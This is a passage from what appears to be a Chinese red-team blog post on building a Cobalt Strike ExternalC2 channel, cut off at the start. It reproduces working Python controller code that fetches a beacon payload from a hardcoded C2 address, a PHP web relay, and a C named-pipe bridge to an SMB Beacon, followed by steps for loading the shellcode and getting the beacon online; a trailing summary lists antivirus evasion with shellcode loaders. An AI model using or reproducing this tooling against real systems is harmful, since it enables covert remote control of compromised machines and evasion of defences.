len(chunk))</span><br><span class="line">    <span class="keyword">return</span> chunk</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_http</span><span class="params">(req, url)</span>:</span></span><br><span class="line">    <span class="comment"># res = req.get(url + "?action=read",proxies=&#123;"http": "http://127.0.0.1:8080"&#125;)</span></span><br><span class="line">    res = req.get(url + <span class="string">"?action=read"</span>)</span><br><span class="line">    print(<span class="string">"read from http: "</span> + str(len(res.content)))</span><br><span class="line">    <span class="comment"># print(res.content)</span></span><br><span class="line">    <span class="keyword">return</span> res.content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_http</span><span class="params">(req, url, data)</span>:</span></span><br><span class="line">    print(<span class="string">"write to http: "</span> + str(len(data)))</span><br><span class="line">    length = struct.pack(<span class="string">"&lt;I"</span>, len(data))</span><br><span class="line">    data = length + data</span><br><span class="line">    <span class="comment"># print(data)</span></span><br><span class="line">    <span class="comment"># req.post(url + "?action=write", data=data, proxies=&#123;"http": "http://127.0.0.1:8080"&#125;)</span></span><br><span class="line">    req.post(url + <span class="string">"?action=write"</span>, data=data)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 轮询函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ctrl_loop</span><span class="params">(s, req, url)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        data = read_http(req, url)</span><br><span class="line">        senddata_pack(s, data)</span><br><span class="line">        recvdata = recvdata_unpack(s)</span><br><span class="line">        write_http(req, url, recvdata)</span><br><span class="line">        <span class="comment">#必要的延迟，否则会出错</span></span><br><span class="line">        time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># externalc2服务的IP和端口</span></span><br><span class="line">    ip = <span class="string">"193.168.113.137"</span></span><br><span class="line">    port = <span class="number">2222</span></span><br><span class="line">    soc = tcpconnect(ip, port)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 请求payload</span></span><br><span class="line">    payloaddata = requestpayload(soc, <span class="string">"x64"</span>, <span class="string">"rcoil"</span>, <span class="number">1000</span>)</span><br><span class="line">    paylaodfile = droppaylod(payloaddata)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"paylaod文件名为： "</span> + paylaodfile)</span><br><span class="line">    print(<span class="string">"请使用loader在被控端执行payload"</span>)</span><br><span class="line">    r = requests.session()</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        url = input(<span class="string">"请输入第三方客户端地址："</span>)</span><br><span class="line">        res = r.get(url)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> res.text == <span class="string">'OK'</span>:</span><br><span class="line">            print(<span class="string">"第三方客户端有问题，请查看。"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    ctrl_loop(soc, r, url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="4-2、Client–Web"><a href="#4-2、Client–Web" class="headerlink" title="4.2、Client–Web"></a>4.2、Client–Web</h3><p>等待 Controller 连接，往下就是对脚本的轮询</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 代码来源：https://github.com/hl0rey/Web_ExternalC2_Demo/blob/master/client/php/piperw.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readpipe</span><span class="params">($name)</span></span>&#123;</span><br><span class="line">    $name=<span class="string">"\\\\.\\pipe\\"</span>.$name;</span><br><span class="line">    $fp=fopen($name,<span class="string">"rb"</span>);</span><br><span class="line">    <span class="comment">//分两次读</span></span><br><span class="line">    $len=fread($fp,<span class="number">4</span>);</span><br><span class="line">    $len=unpack(<span class="string">"v"</span>,$len)[<span class="number">1</span>];</span><br><span class="line">    $data=fread($fp,$len);</span><br><span class="line">    fclose($fp);</span><br><span class="line">    <span class="keyword">echo</span> $data;</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">writepipe</span><span class="params">($name)</span></span>&#123;</span><br><span class="line">    $name=<span class="string">"\\\\.\\pipe\\"</span>.$name;</span><br><span class="line">    $fp=fopen($name,<span class="string">"wb"</span>);</span><br><span class="line">    $data=file_get_contents(<span class="string">"php://input"</span>);</span><br><span class="line">    <span class="comment">//一次性写</span></span><br><span class="line">    fwrite($fp,$data);</span><br><span class="line">    fclose($fp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>]))&#123;</span><br><span class="line">    <span class="comment">//根据请求参数进行不同的操作</span></span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">'action'</span>]==<span class="string">'read'</span>)&#123;</span><br><span class="line">        readpipe(<span class="string">"readrcoil"</span>);</span><br><span class="line">    &#125;<span class="keyword">elseif</span> ($_GET[<span class="string">'action'</span>]==<span class="string">'write'</span>)&#123;</span><br><span class="line">        writepipe(<span class="string">"writercoil"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//脚本执行成功</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"OK"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-3、Client-EXE"><a href="#4-3、Client-EXE" class="headerlink" title="4.3、Client-EXE"></a>4.3、Client-EXE</h3><p>这个客户端也相当与一个中转</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 代码来源：https://github.com/hl0rey/Web_ExternalC2_Demo/blob/master/client/c/webc2_loader/PipeOperationRelay/%E6%BA%90.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAYLOAD_MAX_SIZE 512 * 1024</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFFER_MAX_SIZE 1024 * 1024</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//桥，字面意思。方便把自定义的管道和beacon管道桥接的结构体</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BRIDGE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">HANDLE client;</span><br><span class="line">HANDLE server;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//从beacon读取数据</span></span><br><span class="line"><span class="function">DWORD <span class="title">read_frame</span><span class="params">(HANDLE my_handle, <span class="keyword">char</span>* buffer, DWORD max)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">DWORD size = <span class="number">0</span>, temp = <span class="number">0</span>, total = <span class="number">0</span>;</span><br><span class="line"><span class="comment">/* read the 4-byte length */</span></span><br><span class="line">ReadFile(my_handle, (<span class="keyword">char</span>*)&amp; size, <span class="number">4</span>, &amp;temp, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"read_frame length: %d\n"</span>, size);</span><br><span class="line"><span class="comment">/* read the whole thing in */</span></span><br><span class="line"><span class="keyword">while</span> (total &lt; size) &#123;</span><br><span class="line">ReadFile(my_handle, buffer + total, size - total, &amp;temp,</span><br><span class="line"><span class="literal">NULL</span>);</span><br><span class="line">total += temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//向beacon写入数据</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_frame</span><span class="params">(HANDLE my_handle, <span class="keyword">char</span>* buffer, DWORD length)</span> </span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"write_frame length: %d\n"</span>, length);</span><br><span class="line">DWORD wrote = <span class="number">0</span>;</span><br><span class="line">WriteFile(my_handle, (<span class="keyword">void</span>*)&amp; length, <span class="number">4</span>, &amp;wrote, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"write %d bytes.\n"</span>, wrote);</span><br><span class="line">WriteFile(my_handle, buffer, length, &amp;wrote, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"write %d bytes.\n"</span>, wrote);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//从控制器读取数据</span></span><br><span class="line"><span class="function">DWORD <span class="title">read_client</span><span class="params">(HANDLE my_handle, <span class="keyword">char</span>* buffer)</span> </span>&#123;</span><br><span class="line">DWORD size = <span class="number">0</span>;</span><br><span class="line">DWORD readed = <span class="number">0</span>;</span><br><span class="line">ReadFile(my_handle, &amp;size, <span class="number">4</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"read_client length: %d\n"</span>, size);</span><br><span class="line">ReadFile(my_handle, buffer, size, &amp;readed, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"final data from client: %d\n"</span>, readed);</span><br><span class="line"><span class="keyword">return</span> readed;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//向控制器写入数据</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_client</span><span class="params">(HANDLE my_handle, <span class="keyword">char</span>* buffer, DWORD length)</span> </span>&#123;</span><br><span class="line">DWORD wrote = <span class="number">0</span>;</span><br><span class="line">WriteFile(my_handle, buffer, length, &amp;wrote, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"write client total %d data %d\n"</span>, wrote, length);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//客户端读管道、服务端写管道逻辑</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ReadOnlyPipeProcess</span><span class="params">(LPVOID lpvParam)</span> </span>&#123;</span><br><span class="line"><span class="comment">//把两条管道的句柄取出来</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BRIDGE</span>* <span class="title">bridge</span> = (<span class="title">struct</span> <span class="title">BRIDGE</span>*)<span class="title">lpvParam</span>;</span></span><br><span class="line">HANDLE hpipe = bridge-&gt;client;</span><br><span class="line">HANDLE beacon = bridge-&gt;server;</span><br><span class="line"></span><br><span class="line">DWORD length = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span>* buffer = VirtualAlloc(<span class="number">0</span>, BUFFER_MAX_SIZE, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (buffer == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//再次校验管道</span></span><br><span class="line"><span class="keyword">if</span> ((hpipe == INVALID_HANDLE_VALUE) || (beacon == INVALID_HANDLE_VALUE))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (TRUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (ConnectNamedPipe(hpipe, <span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"client want read.\n"</span>);</span><br><span class="line">length = read_frame(beacon, buffer, BUFFER_MAX_SIZE);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"read from beacon: %d\n"</span>, length);</span><br><span class="line"><span class="comment">//分两次传送，发一次长度，再发数据。</span></span><br><span class="line">write_client(hpipe,(<span class="keyword">char</span> *) &amp;length, <span class="number">4</span>);</span><br><span class="line">FlushFileBuffers(hpipe);</span><br><span class="line">write_client(hpipe, buffer, length);</span><br><span class="line">FlushFileBuffers(hpipe);</span><br><span class="line">DisconnectNamedPipe(hpipe);</span><br><span class="line"><span class="comment">//清空缓存区</span></span><br><span class="line">ZeroMemory(buffer, BUFFER_MAX_SIZE);</span><br><span class="line">length = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//客户端写管道、服务端读管道逻辑</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">WriteOnlyPipeProcess</span><span class="params">(LPVOID lpvParam)</span> </span>&#123;</span><br><span class="line"><span class="comment">//取出两条管道</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BRIDGE</span>* <span class="title">bridge</span> = (<span class="title">struct</span> <span class="title">BRIDGE</span>*)<span class="title">lpvParam</span>;</span></span><br><span class="line">HANDLE hpipe = bridge-&gt;client;</span><br><span class="line">HANDLE beacon = bridge-&gt;server;</span><br><span class="line"></span><br><span class="line">DWORD length = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span>* buffer = VirtualAlloc(<span class="number">0</span>, BUFFER_MAX_SIZE, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (buffer == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((hpipe == INVALID_HANDLE_VALUE) || (beacon == INVALID_HANDLE_VALUE))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (TRUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (ConnectNamedPipe(hpipe, <span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//一次性读，一次性写</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"client want write.\n"</span>);</span><br><span class="line">length = read_client(hpipe, buffer);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"read from client: %d\n"</span>, length);</span><br><span class="line">write_frame(beacon, buffer, length);</span><br><span class="line">DisconnectNamedPipe(hpipe);</span><br><span class="line"><span class="comment">//清空缓存区</span></span><br><span class="line">ZeroMemory(buffer, BUFFER_MAX_SIZE);</span><br><span class="line">length = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建客户端读管道</span></span><br><span class="line">HANDLE hPipeRead = CreateNamedPipe(<span class="string">"\\\\.\\pipe\\readrcoil"</span>, PIPE_ACCESS_OUTBOUND, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, BUFFER_MAX_SIZE, BUFFER_MAX_SIZE, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//创建客户端写管道</span></span><br><span class="line">HANDLE hPipeWrite = CreateNamedPipe(<span class="string">"\\\\.\\pipe\\writercoil"</span>, PIPE_ACCESS_INBOUND, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, BUFFER_MAX_SIZE, BUFFER_MAX_SIZE, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//与beacon建立连接</span></span><br><span class="line">HANDLE hfileServer = CreateFileA(<span class="string">"\\\\.\\pipe\\rcoil"</span>, GENERIC_READ | GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, SECURITY_SQOS_PRESENT | SECURITY_ANONYMOUS, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//检测管道和连接是否建立成功</span></span><br><span class="line"><span class="keyword">if</span> ((hPipeRead == INVALID_HANDLE_VALUE) || (hPipeWrite == INVALID_HANDLE_VALUE) || (hfileServer == INVALID_HANDLE_VALUE))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (hPipeRead == INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"error during create readpipe."</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (hPipeWrite == INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"error during create writepipe."</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (hfileServer == INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"error during connect to beacon."</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//一切正常</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"all pipes are ok.\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//放入客户端读管道和beacon连接</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BRIDGE</span> <span class="title">readbridge</span>;</span></span><br><span class="line">readbridge.client = hPipeRead;</span><br><span class="line">readbridge.server = hfileServer;</span><br><span class="line"><span class="comment">//启动客户端读管道逻辑</span></span><br><span class="line">HANDLE hTPipeRead = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ReadOnlyPipeProcess, (LPVOID)&amp; readbridge, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//放入客户端写管道和beacon连接</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BRIDGE</span> <span class="title">writebridge</span>;</span></span><br><span class="line">writebridge.client = hPipeWrite;</span><br><span class="line">writebridge.server = hfileServer;</span><br><span class="line"><span class="comment">//启动客户端写管道逻辑</span></span><br><span class="line">HANDLE hTPipeWrite = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, WriteOnlyPipeProcess, (LPVOID)&amp; writebridge, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//代码没有什么意义，直接写个死循环也行</span></span><br><span class="line">HANDLE waitHandles[] = &#123; hPipeRead,hPipeWrite &#125;;</span><br><span class="line"><span class="keyword">while</span> (TRUE)</span><br><span class="line">&#123;</span><br><span class="line">WaitForMultipleObjects(<span class="number">2</span>, waitHandles, TRUE, INFINITE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然，自用的会使用 <code>C#</code> 进行重写。</p><h2 id="0x05-实操"><a href="#0x05-实操" class="headerlink" title="0x05 实操"></a>0x05 实操</h2><h3 id="5-1、加载脚本"><a href="#5-1、加载脚本" class="headerlink" title="5.1、加载脚本"></a>5.1、加载脚本</h3><p>加载 <code>ExternalC2.cna</code>，完成第一步。</p><p><img src="/image/【渗透技巧】Cobalt Strike 的 ExternalC2/blog_2019-10-10_10-24-23.png" alt=""></p><h3 id="5-2、Controller"><a href="#5-2、Controller" class="headerlink" title="5.2、Controller"></a>5.2、Controller</h3><p>这里我们使用的代码是参照 <a href="https://github.com/xpn" target="_blank" rel="noopener">XPN </a>的代码写成与上方 <a href="https://github.com/hl0rey" target="_blank" rel="noopener">hl0rey</a> 一样格式的代码。</p><p><img src="/image/【渗透技巧】Cobalt Strike 的 ExternalC2/blog_2019-10-10_11-03-43.png" alt=""></p><h3 id="5-3、Client"><a href="#5-3、Client" class="headerlink" title="5.3、Client"></a>5.3、Client</h3><p>使用加载器加载这一段 <code>shellcode</code>，查看 <code>pipelist</code>，可以看到我们自定义的管道名。</p><p><img src="/image/【渗透技巧】Cobalt Strike 的 ExternalC2/Snipaste_2019-10-10_11-08-30.png" alt=""></p><p>到这里，可以说明 <code>SMB Beacon</code> 已经成功运行，目前缺少的是可与之进行交互的上层进程。往下继续，运行 <code>Client-EXE</code>（使用hl0rey的代码），再次查看 <code>pipelist</code>，结果如下</p><p><img src="/image/【渗透技巧】Cobalt Strike 的 ExternalC2/Snipaste_2019-10-10_13-02-01.png" alt=""></p><h3 id="5-4、Cobalt-Strike"><a href="#5-4、Cobalt-Strike" class="headerlink" title="5.4、Cobalt Strike"></a>5.4、Cobalt Strike</h3><p>成功上线。</p><p><img src="/image/【渗透技巧】Cobalt Strike 的 ExternalC2/blog_2019-10-10_13-06-47.png" alt=""></p><h3 id="5-5、问题"><a href="#5-5、问题" class="headerlink" title="5.5、问题"></a>5.5、问题</h3><p>但是，查看 <code>PipeOption.exe</code>，崩了。同时，<code>Cobalt Strike</code> 上线的机器，心跳包正常，但是功能无法使用。</p><p><img src="/image/【渗透技巧】Cobalt Strike 的 ExternalC2/Snipaste_2019-10-10_14-48-45.png" alt=""></p><p>应该是 <code>PipeOption.exe</code> 和 <code>php 脚本</code>之间出现的问题，通过抓包，发现这里应该是权限问题。</p><p><img src="/image/【渗透技巧】Cobalt Strike 的 ExternalC2/blog_2019-10-10_15-47-37.png" alt=""></p><p>将 <code>PipeOpiton.exe</code> 以管理员权限运行，<code>action=read</code> 则没出错。</p><p>向 <code>Lz1y</code> 大佬请教了下，还是改改 <code>Client-EXE</code> 和 <code>Client-Web</code> 的代码算了。不使用命名管道，直接读写文件，这样 <code>Client-Web</code> 的不同版本也可以很好写。看到这里是不是很蛋疼，嘤嘤嘤。相关代码后续再补上吧，留个坑！！！</p><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p><a href="https://blog.xpnsec.com/exploring-cobalt-strikes-externalc2-framework/" target="_blank" rel="noopener">Exploring Cobalt Strike’s ExternalC2 framework</a><br><a href="https://mp.weixin.qq.com/s/q3QZ41qwFcKaIL7qb6q1fQ" target="_blank" rel="noopener">利用 External C2 解决内网服务器无法出网的问题</a><br><a href="https://www.anquanke.com/post/id/103395" target="_blank" rel="noopener">一起探索Cobalt Strike的ExternalC2框架</a><br><a href="https://www.cobaltstrike.com/downloads/externalc2spec.pdf" target="_blank" rel="noopener">externalc2spec.pdf</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;&lt;code&gt;Cobalt Strike&lt;/code&gt; 的上线问题归结为以下几点：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&quot;text-align:center&quot;&gt;问题&lt;/th&gt;
&lt;th style=&quot;text-align:center&quot;&gt;解决方法&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;目标存在杀软（被杀）&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;Shellcode 加载器&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;目标存在杀软（拦截连接）&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;C2 处理&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;目标机是 Web 映射出网&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;特殊 C2 处理&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;隔离网络&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;出网机器做跳板&lt;/td&gt;
&lt;/tr&gt;
